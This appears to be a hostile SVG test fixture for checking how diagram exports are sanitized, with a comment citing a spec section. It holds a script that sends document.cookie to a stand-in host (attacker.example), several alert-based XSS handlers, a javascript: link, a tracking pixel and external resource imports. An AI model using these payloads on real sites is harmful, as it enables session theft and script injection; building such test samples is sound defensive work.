<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 200 100" width="200" height="100">
  <script type="text/javascript">
    // Excalidraw exports are SVG, so this is the normal path for diagrams —
    // which is exactly why it cannot be trusted (§5.5).
    fetch('https://attacker.example/steal?c=' + document.cookie);
  </script>
  <rect width="200" height="100" fill="#eeeeee" onload="alert(1)" onclick="alert(2)"/>
  <foreignObject width="200" height="100">
    <body xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(3)"/></body>
  </foreignObject>
  <image href="https://attacker.example/tracker.png" width="1" height="1"/>
  <a xlink:href="javascript:alert(4)"><text x="10" y="50">Click me</text></a>
  <use xlink:href="https://attacker.example/external.svg#g"/>
  <style>@import url("https://attacker.example/font.css"); text { fill: #333; }</style>
  <text x="10" y="80" fill="#333">Legitimate label</text>
</svg>
